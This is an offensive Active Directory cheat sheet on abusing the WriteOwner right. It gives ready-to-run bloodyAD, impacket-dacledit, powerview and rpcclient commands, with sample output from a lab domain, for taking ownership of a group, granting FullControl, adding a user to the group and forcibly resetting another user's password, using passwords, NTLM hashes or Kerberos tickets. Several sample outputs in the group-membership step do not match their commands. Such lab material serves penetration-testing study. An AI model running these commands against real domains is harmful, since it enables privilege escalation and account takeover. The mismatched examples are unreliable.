---
title: "WriteOwner/Own"
tags: ["Active Directory", "WriteOwner/Own", "AddMember", "Dacledit", "Domain Controller", "Impacket", "Own", "Permissions", "Powerview", "Windows", "WriteOwner"]
---

{{< filter_buttons >}}

### Change Owner of the Group/User

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set1-1 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

#### 1. Change Owner

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set owner '<TARGET_IDENTITY>' '<TARGET_USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --host dc01.haze.htb set owner 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by haze-it-backup$ on SUPPORT_SERVICES
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set owner '<TARGET_IDENTITY>' '<TARGET_USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 --host dc01.haze.htb set owner 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by haze-it-backup$ on SUPPORT_SERVICES
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set owner '<TARGET_IDENTITY>' '<TARGET_USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --host dc01.haze.htb set owner 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by haze-it-backup$ on SUPPORT_SERVICES
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set owner '<TARGET_IDENTITY>' '<TARGET_USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p '735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 -k --host dc01.haze.htb set owner 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by haze-it-backup$ on SUPPORT_SERVICES
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set owner '<TARGET_IDENTITY>' '<TARGET_USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -k --host dc01.haze.htb set owner 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by haze-it-backup$ on SUPPORT_SERVICES
```

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

#### 1. Connect

```console {class="password"}
# Password
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb'
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ntlm"}
# NTLM
powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>'
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc'
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb' -k
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
powerview '<DOMAIN>/<USER>@<TARGET>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -k --no-pass
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

#### 2. Change Owner

```console
Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>'
```

```console {class="sample-code"}
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ Set-DomainObjectOwner -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$'
[2025-10-31 21:39:34] [Set-DomainObjectOwner] Changing current owner S-1-5-21-323145914-28650650-2368316563-512 to S-1-5-21-323145914-28650650-2368316563-1111
[2025-10-31 21:39:34] [Set-DomainObjectOwner] Success! modified owner for CN=Support_Services,CN=Users,DC=haze,DC=htb
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> . .\PowerView.ps1
```

#### 2. Change Owner

```console
Set-DomainObjectOwner -Identity '<TARGET_IDENTITY>' -OwnerIdentity '<TARGET_USER>'
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> Set-DomainObjectOwner -Identity 'SUPPORT_SERVICES' -OwnerIdentity 'haze-it-backup$'
```

{{< /tabcontent >}}

---

### Add User to the Group

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{<  tabcontent set2 tab1  >}}

#### 1. Add Full Control to the User Over the Group

{{< tab set2-1 tab1 active >}}impacket{{< /tab >}}{{< tab set2-1 tab2 >}}bloodyAD{{< /tab >}}{{< tab set2-1 tab3 >}}powerview.py{{< /tab >}}
{{< tabcontent set2-1 tab1 >}}

```console {class="password"}
# Password
impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ impacket-dacledit 'haze.htb/haze-it-backup$:Password123!' -dc-ip dc01.haze.htb -principal 'haze-it-backup$' -target 'SUPPORT_SERVICES' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251031-215454.bak
[*] DACL modified successfully!
```

```console {class="ntlm"}
# NTLM
impacket-dacledit '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ impacket-dacledit 'haze.htb/haze-it-backup$' -hashes ':735c02c6b2dc54c3c8c6891f55279ebc' -dc-ip dc01.haze.htb -principal 'haze-it-backup$' -target 'SUPPORT_SERVICES' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251031-215454.bak
[*] DACL modified successfully!
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.232.50 && impacket-dacledit 'haze.htb/haze-it-backup$:Password123!' -k -dc-ip dc01.haze.htb -principal 'haze-it-backup$' -target 'SUPPORT_SERVICES' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251031-220251.bak
[*] DACL modified successfully!
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>' -hashes ':<HASH>' -k -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.232.50 && impacket-dacledit 'haze.htb/haze-it-backup$' -hashes ':735c02c6b2dc54c3c8c6891f55279ebc' -k -dc-ip dc01.haze.htb -principal 'haze-it-backup$' -target 'SUPPORT_SERVICES' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251031-220251.bak
[*] DACL modified successfully!
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>' -k -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.232.50 && impacket-dacledit 'haze.htb/haze-it-backup$' -k -dc-ip dc01.haze.htb -principal 'haze-it-backup$' -target 'SUPPORT_SERVICES' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251031-220251.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab2 >}}

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p '735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 -k --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -k --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab3 >}}

```console
Add-DomainObjectAcl -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<USER>' -Rights fullcontrol
```

```console {class="sample-code"}
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$' -Rights fullcontrol
[2025-10-31 22:15:34] [Add-DomainObjectACL] Found target identity: CN=Support_Services,CN=Users,DC=haze,DC=htb
[2025-10-31 22:15:34] [Add-DomainObjectACL] Found principal identity: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
[2025-10-31 22:15:34] Adding FullControl to S-1-5-21-323145914-28650650-2368316563-1112
[2025-10-31 22:15:34] [Add-DomainObjectACL] Success! Added ACL to CN=Support_Services,CN=Users,DC=haze,DC=htb
```

{{< /tabcontent >}}

#### 2. Add User to the Group

{{< tab set2-2 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set2-2 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set2-2 tab1 >}}

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p '735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 -k --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -k --host dc01.haze.htb add genericAll 'SUPPORT_SERVICES' 'haze-it-backup$'
[+] haze-it-backup$ has now GenericAll on SUPPORT_SERVICES
```

{{< /tabcontent >}}
{{< tabcontent set2-2 tab2 >}}

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

```console {class="sample-code"}
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$' -Rights fullcontrol
[2025-10-31 22:23:23] [Add-DomainObjectACL] Found target identity: CN=Support_Services,CN=Users,DC=haze,DC=htb
[2025-10-31 22:23:23] [Add-DomainObjectACL] Found principal identity: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
[2025-10-31 22:23:23] Adding FullControl to S-1-5-21-323145914-28650650-2368316563-1112
[2025-10-31 22:23:23] [Add-DomainObjectACL] Success! Added ACL to CN=Support_Services,CN=Users,DC=haze,DC=htb
```

{{< /tabcontent >}}

#### 3. Check

{{< tab set2-3 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set2-3 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set2-3 tab1 >}}

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<GROUP>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' --host dc01.haze.htb get object 'SUPPORT_SERVICES'

distinguishedName: CN=Support_Services,CN=Users,DC=haze,DC=htb
cn: Support_Services
dSCorePropagationData: 2025-10-31 22:42:14+00:00
groupType: -2147483646
instanceType: 4
member: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
---[SNIP]---
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get object '<GROUP>'
```

```console {class="sample-code"}
$ bloodyAD -d haze.htb -u 'haze-it-backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 --host dc01.haze.htb get object 'SUPPORT_SERVICES'     

distinguishedName: CN=Support_Services,CN=Users,DC=haze,DC=htb
cn: Support_Services
dSCorePropagationData: 2025-10-31 22:42:14+00:00
groupType: -2147483646
instanceType: 4
member: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
---[SNIP]---
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> get object '<GROUP>'
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.31.115 && bloodyAD -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --host dc01.haze.htb get object 'SUPPORT_SERVICES'

distinguishedName: CN=Support_Services,CN=Users,DC=haze,DC=htb
cn: Support_Services
dSCorePropagationData: 2025-10-31 22:46:22+00:00
groupType: -2147483646
instanceType: 4
member: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
---[SNIP]---
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> get object '<GROUP>'
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.31.115 && bloodyAD -d haze.htb -u 'haze-it-backup$' -p '735c02c6b2dc54c3c8c6891f55279ebc' -f rc4 -k --host dc01.haze.htb get object 'SUPPORT_SERVICES'

distinguishedName: CN=Support_Services,CN=Users,DC=haze,DC=htb
cn: Support_Services
dSCorePropagationData: 2025-10-31 22:46:22+00:00
groupType: -2147483646
instanceType: 4
member: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
---[SNIP]---
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> get object '<GROUP>'
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.31.115 && bloodyAD -d haze.htb -u 'haze-it-backup$' -k --host dc01.haze.htb get object 'SUPPORT_SERVICES'

distinguishedName: CN=Support_Services,CN=Users,DC=haze,DC=htb
cn: Support_Services
dSCorePropagationData: 2025-10-31 22:46:22+00:00
groupType: -2147483646
instanceType: 4
member: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
---[SNIP]---
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set2-3 tab2 >}}

```console
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ Get-DomainGroupMember -Identity 'Support_Services'                           
GroupDomainName             : Support_Services
GroupDistinguishedName      : CN=Support_Services,CN=Users,DC=haze,DC=htb
MemberDomain                : haze.htb
MemberName                  : Haze-IT-Backup$
MemberDistinguishedName     : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
MemberSID                   : S-1-5-21-323145914-28650650-2368316563-1111
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> . .\PowerView.ps1
```

#### 2. Add Full Control to the User Over the Group

```console
Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity '<USER>' -Rights All -DomainController <DC>
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> Add-DomainObjectAcl -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$' -Rights All -DomainController dc01.haze.htb
```

#### 4. Add User to the Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $cred
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> Add-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Members 'haze-it-backup$'
```

#### 5. Check

```console
Get-DomainGroupMember -Identity '<GROUP>' -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> Get-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Domain haze.htb -DomainController dc01.haze.htb | fl MemberName

MemberName : Haze-IT-Backup$
```

{{< /tabcontent >}}

---

### Change Target User Password

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tab set3 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set3 tab1 >}}
{{< tab set3-1 tab1 active>}}bloodyAD{{< /tab >}}{{< tab set3-1 tab2 >}}rpcclient{{< /tab >}}
{{< tabcontent set3-1 tab1 >}}

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set3-1 tab2 >}}

```console {class="password"}
# Password
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>'
```

```console {class="sample-code"}
$ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2 smith 23 Password123!'
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}
{{< tab set3-2 tab1 active>}}powershell{{< /tab >}}{{< tab set3-2 tab2 >}}powerview{{< /tab >}}
{{< tabcontent set3-2 tab1 >}}

```console
Set-ADAccountPassword -Identity "<TARGET_USER>" -NewPassword (ConvertTo-SecureString "<NEW_PASSWORD>" -AsPlainText -Force) -Reset
```

{{< /tabcontent >}}
{{< tabcontent set3-2 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Change Target User Password

```console
$password = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $password
```

{{< /tabcontent >}}
{{< /tabcontent >}}

<br>